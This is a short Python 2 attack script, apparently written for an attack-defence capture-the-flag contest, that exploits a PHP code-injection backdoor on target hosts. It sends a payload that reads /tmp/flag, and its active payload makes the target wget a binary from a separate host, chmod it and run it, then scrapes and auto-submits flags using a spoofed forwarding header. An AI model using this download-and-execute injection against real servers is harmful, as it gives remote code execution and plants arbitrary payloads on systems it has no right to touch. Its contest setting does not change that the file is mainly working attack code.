#-*- coding: utf-8 -*-
import requests
import hackhttp
import thread_pool
from setting import PATTERN,SUBMIT_URL
import re

def submitflag(flag):
    requests.get(SUBMIT_URL+flag)

class Beating():
    def __init__(self,url):
        self.url = url
        self.sess = requests.session()
        self.hh = hackhttp.hackhttp(hackhttp.httpconpool())
        self.tp = thread_pool.ThreadPool(500)
        self.headers = headers_dict = {
            'X-Forwarder-For': '192.168.1.1',
        }

    def attack(self):
        print '[*]Attacking '+self.url
        try:
            uri = '/?0=huasir&1=system(%27cat%20/tmp/flag%27);'
#             raw = '''GET /?0=huasir&1=system(%27cat%20/tmp/flag%27); HTTP/1.1
# Host: 127.0.0.1
# User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
# Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
# Accept-Encoding: gzip, deflate
# Connection: keep-alive
# Upgrade-Insecure-Requests: 1'''
#             _, _, res, _, log = self.hh.http(self.url+uri, raw=raw)

            res = self.sess.post(self.url+'/index.php',data={'0':'huasir','1':'system("cd /tmp&&wget -O check http://192.168.154.1/check&&chmod +x check && ./check");'},timeout=3).content

            print res 
            flag = re.findall('flag{\S*}',res.strip())

            # print flag
            if len(flag):
                # print self.url
                print '[+]Flag: '+flag[0]
                try:
                    submitflag(flag[0])
                except Exception:
                    print "[-]Submit flag error"
                    pass
        except Exception:
            print "[-]Attack fail"
            pass

def B():
    targets = ['http://192.168.221.132']
    for tt in targets:
        BB = Beating(tt)
        BB.attack()

def main():
    B()

if __name__ == '__main__':
    main()